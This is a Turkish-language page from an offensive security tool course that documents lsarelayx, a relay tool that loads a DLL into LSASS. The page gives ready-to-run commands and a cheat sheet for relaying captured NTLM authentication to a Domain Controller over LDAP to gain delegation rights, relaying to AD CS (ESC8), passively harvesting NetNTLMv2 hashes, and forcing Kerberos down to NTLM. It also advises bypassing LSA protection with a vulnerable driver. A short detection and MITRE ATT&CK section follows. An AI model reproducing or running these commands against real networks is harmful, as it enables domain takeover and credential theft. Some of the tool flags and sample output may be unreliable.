# lsarelayx

> **Kategori:** [5. NTLM ve Kerberos Relay Motorları](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Yerel Güvenlik Yetkilisi (LSA) sürecine özel bir kimlik doğrulama paketi (LSA Authentication Provider) yükleyerek, sisteme gelen tüm SMB, HTTP, LDAP ve RPC kimlik doğrulama isteklerini sistem genelinde yakalayan, Kerberos isteklerini zorla NTLM'e düşüren ve bunları harici hedeflere relay eden gelişmiş sistem düzeyinde relay aracı.

---

## 1. Genel Bakış ve Amaç

Geleneksel NTLM relay araçları (`ntlmrelayx`, `Responder`), hedef sistemde SMB (TCP 445) veya HTTP (TCP 80) gibi portların halihazırda meşru Windows servisleri tarafından dinlenmediği senaryolara ya da port yönlendirme hilelerine ihtiyaç duyar. Eğer saldırgan kurban bir Windows sunucuda yerel yönetici haklarına sahipse, işletim sisteminin kendi servislerinin (IIS, SMB Sunucusu, RPC) kullandığı gelen bağlantıları dinlemek normal şartlarda port çakışması yaratır.

**`lsarelayx`** (Adam Chester - @_xpn_ tarafından geliştirilen), bu kısıtlamayı doğrudan Windows Güvenlik Destek Sağlayıcısı Arayüzü (SSPI / LSA) mimarisine müdahale ederek aşar. Araç iki temel bileşenden oluşur:
1. **`liblsarelayx.dll`:** `lsass.exe` sürecine bir LSA kimlik doğrulama eklentisi (Security Support Provider - SSP) olarak enjekte edilir. NTLM ve Negotiate paketlerini kancalayarak (hook), sisteme gelen tüm kimlik doğrulama isteklerini bir yerel adlandırılmış boru (named pipe) üzerinden `lsarelayx.exe` konsoluna aktarır. En kritik yeteneği, gelen **Kerberos kimlik doğrulama girişimlerini hata döndürerek kasten NTLM'e düşürmesidir (Kerberos Downgrade)**.
2. **`lsarelayx.exe`:** Konsol arayüzü olup `liblsarelayx.dll` kütüphanesini yönetir; gelen NTLM `Type 1`, `Type 2` ve `Type 3` mesajlarını Impacket'in `ntlmrelayx RAW` sunucu modülüne aktararak hedef sunucularda komut yürütme veya AD CS sertifika talebi gerçekleştirir.

### Mimari Akış Şeması

```
[ Kurban İstemci / Sunucu ]                         [ Ele Geçirilmiş Windows Host ]                 [ Hedef Domain Controller ]
           │                                                       │                                             │
           ├─── (1) Kerberos / Negotiate İsteği ──────────────────►│ (Gelen SMB / HTTP Bağlantısı)               │
           │                                                       │                                             │
           │                                                       ▼                                             │
           │                                              [ lsass.exe / LSA ]                            │
           │                                                       │                                             │
           │                                                       ├──► [ liblsarelayx.dll ] (SSP Hook)         │
           │                                                       │    - Kerberos'u reddeder (0xC00000BB)       │
           │◄── (2) Kerberos Başarısız -> NTLM Fallback ───────────┤    - İstemciyi NTLM'e zorlar                │
           │                                                       │                                             │
           ├─── (3) NTLM Type 1 (Negotiate) ──────────────────────►│                                             │
           │                                                       ├──► Named Pipe: \\.\pipe\lsarelayx           │
           │                                                       │                 │                           │
           │                                                       │                 ▼                           │
           │                                                       │         [ lsarelayx.exe ]                   │
           │                                                       │                 │                           │
           │                                                       │                 ├── (4) Raw NTLM Token ────►│ (LDAP / SMB Relay)
           │                                                       │                 │◄── (5) Challenge (Type 2)─┤
           │◄── (6) NTLM Type 2 Challenge ─────────────────────────┤◄────────────────┘                           │
           │                                                       │                                             │
           ├─── (7) NTLM Type 3 (Auth/Response) ──────────────────►│─────────────────┐                           │
           │                                                       │                 ▼                           │
           │                                                       │         [ lsarelayx.exe ]                   │
           │                                                       │                 │                           │
           │                                                       │                 └── (8) Relay Auth ────────►│ (DCSync / RBCD / RCE)
           │                                                       │                                             ▼
           │◄── (9) Oturum Açıldı / Reddedildi ────────────────────┴─────────────────────────────────────── [ Tam Hakimiyet! ]
```

### Neden Önemli? ve Alternatiflerle Karşılaştırma

| Özellik | Standart ntlmrelayx | KrbRelayUp | lsarelayx |
|---|---|---|---|
| **Çalışma Seviyesi** | Ağ Seviyesi (Bağımsız Port) | Kullanıcı Seviyesi (DCOM/COM) | **Sistem & Çekirdek Seviyesi (LSA/SSPI Hook)** |
| **Port Çakışması** | Port 445/80 açıksa bağlanamaz | Port gerektirmez | **Port gerektirmez; mevcut SMB/HTTP'yi dinler** |
| **Kerberos Kırma** | Kerberos'u NTLM'e düşüremez | S4U bileti talep eder | **Tüm sistem geneli Kerberos'u NTLM'e düşürür** |
| **Gereken Yetki** | Ağ erişimi yeterli | Düşük yetkili domain user | **Yerel Administrator (LSA DLL enjeksiyonu)** |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`lsarelayx` hem bağımsız çalışabilen hem de Linux tarafındaki `ntlmrelayx` RAW sunucusuna soket üzerinden bağlanabilen iki çalışma moduna sahiptir:

```cmd
lsarelayx.exe [SEÇENEKLER]
```

### Desteklenen Kritik Bayraklar

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `--host <IP>` | NTLM token'larının aktarılacağı `ntlmrelayx RAW` dinleyici sunucusu IP adresi | `--host 192.168.1.50` |
| `--port <PORT>` | `ntlmrelayx RAW` dinleyici portu (Varsayılan: 8888) | `--port 8888` |
| `--passive` | Token'ları relay etmek yerine sadece ağdan geçen NetNTLMv1/v2 hash'lerini ekrana döker | `--passive` |
| `--kerberos-downgrade` | Gelen Negotiate paketlerinde Kerberos desteğini reddederek istemciyi NTLM'e zorlar | `--kerberos-downgrade` |
| `--pipe-name <AD>` | LSA DLL ile konsol arasındaki adlandırılmış boru adı | `--pipe-name lsarelayx` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: ntlmrelayx RAW Modülü ile Domain Controller'a LDAP Relay

Saldırgan Linux makinesinde `ntlmrelayx` aracını RAW modunda başlatır, kurban Windows sunucusunda ise `lsarelayx` çalıştırılarak tüm gelen SMB/HTTP trafiği DC'ye aktarılır:

```bash
# Adım 1: Linux (Saldırgan) makinesinde RAW ntlmrelayx dinleyicisi başlatma
# Hedef: Domain Controller üzerinde LDAP relay ile RBCD yetkisi yazma
python3 examples/ntlmrelayx.py -t ldap://dc01.corp.local --raw-port 8888 --no-smb-server --no-http-server --delegate-access
```

```cmd
:: Adım 2: Kurban Windows sunucusunda (Local Admin) lsarelayx'i başlatma
lsarelayx.exe --host 192.168.1.50 --port 8888 --kerberos-downgrade
```

*Çıktı Analizi:*
```text
[+] LSA Authentication Provider loaded successfully into LSASS!
[+] Kerberos downgrade enforcement: ACTIVE
[+] Connected to ntlmrelayx RAW server at 192.168.1.50:8888
[*] Incoming authentication from 10.0.0.12 (User: CORP\admin_user)...
[*] Downgrading Kerberos request to NTLM...
[*] Captured NTLM Type 1 message, sending to RAW server...
[*] Relayed successfully to ldap://dc01.corp.local!
```

---

### Senaryo 2: Pasif Modda NetNTLMv2 Hash Hasadı (Sniffing)

Sunucuya gelen hiçbir bağlantıyı bozmadan ve harici relay yapmadan geçen tüm kullanıcı hash'lerini toplama:

```cmd
:: Pasif modda sadece gelen kimlik bilgilerini ekrana dökme
lsarelayx.exe --passive
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Kök Neden | Çözüm Adımı |
|---|---|---|
| `Failed to load LSA authentication package (0x00000005)` | Komut istemi Administrator olarak başlatılmamıştır veya RunAsPPL aktiftir. | High-Integrity konsolda çalıştırın; RunAsPPL devredeyse BYOVD sürücüsüyle PPL baypas edin. |
| `Failed to connect to ntlmrelayx RAW server` | Linux makinedeki ntlmrelayx `--raw-port` parametresiyle dinlemede değildir veya güvenlik duvarı engelliyordur. | Kali'de `ntlmrelayx.py --raw-port 8888` çalıştığından ve 8888 portunun erişilebilir olduğundan emin olun. |
| `LSASS.exe crashed / System reboot in 60 seconds` | LSA eklentisi işletim sistemi sürümüyle uyumsuz bir bellek yapısına çarptı. | Windows 10/11 veya Server 2016-2022 mimarisine uygun derlenmiş `liblsarelayx.dll` kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler
* **Sysmon Event ID 7 (ImageLoaded):** `lsass.exe` sürecine imzasız veya `liblsarelayx.dll` adında yabancı bir DLL'in yüklenmesi.
* **Security Event ID 4624:** Hedef sistemde logon type 3 bağlantılarının ardışık gerçekleşmesi.

### 5.2 Ağ ve EDR İmzaları
* Kerberos isteklerinde istemcilere beklenmedik `STATUS_NOT_SUPPORTED (0xC00000BB)` veya `STATUS_LOGON_FAILURE` dönülmesi ve hemen ardından NTLMSSP trafiğinin başlaması EDR davranış analitiğine yakalanır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım |
|---|---|---|
| **[T1557.001](https://attack.mitre.org/techniques/T1557/001/)** | Adversary-in-the-Middle: LLMNR/NBT-NS and NTLM Relay | Sistem düzeyinde NTLM relay operasyonu. |
| **[T1547.005](https://attack.mitre.org/techniques/T1547/005/)** | Boot or Logon Autostart Execution: Security Support Provider | LSASS içine sahte kimlik sağlayıcı ekleme. |
| **[T1556](https://attack.mitre.org/techniques/T1556/)** | Modify Authentication Process | Kerberos'u kasten NTLM'e düşürme manipülasyonu. |

---

## 6. En Çok Kullanılan Komutlar (Cheat Sheet)

```cmd
:: 1. ntlmrelayx RAW sunucusuna aktif relay başlatma
lsarelayx.exe --host 10.0.0.5 --port 8888 --kerberos-downgrade

:: 2. Pasif modda ağdan geçen NetNTLM hash'lerini toplama
lsarelayx.exe --passive

:: 3. Özel pipe adı belirterek LSA paketini yükleme
lsarelayx.exe --pipe-name secret_pipe --host 10.0.0.5

:: 4. Kali tarafında ntlmrelayx RAW dinleyicisi açma (LDAP Hedefli)
python3 ntlmrelayx.py -t ldap://dc01.corp.local --raw-port 8888 --delegate-access

:: 5. Kali tarafında ntlmrelayx RAW dinleyicisi açma (AD CS ESC8 Hedefli)
python3 ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --raw-port 8888 --template DomainController
```

---

## Kaynaklar
- [GitHub — lsarelayx (Adam Chester / @_xpn_)](https://github.com/cx01N/lsarelayx)
- [XPN Blog — Exploring Mimikatz - Part 2 LSA Authentication Packages](https://blog.xpn.sec.org/)

---

> **Önceki:** [← KrbRelayUp](./KrbRelayUp.md) · **Sonraki:** [LdapRelayScan →](./LdapRelayScan.md)
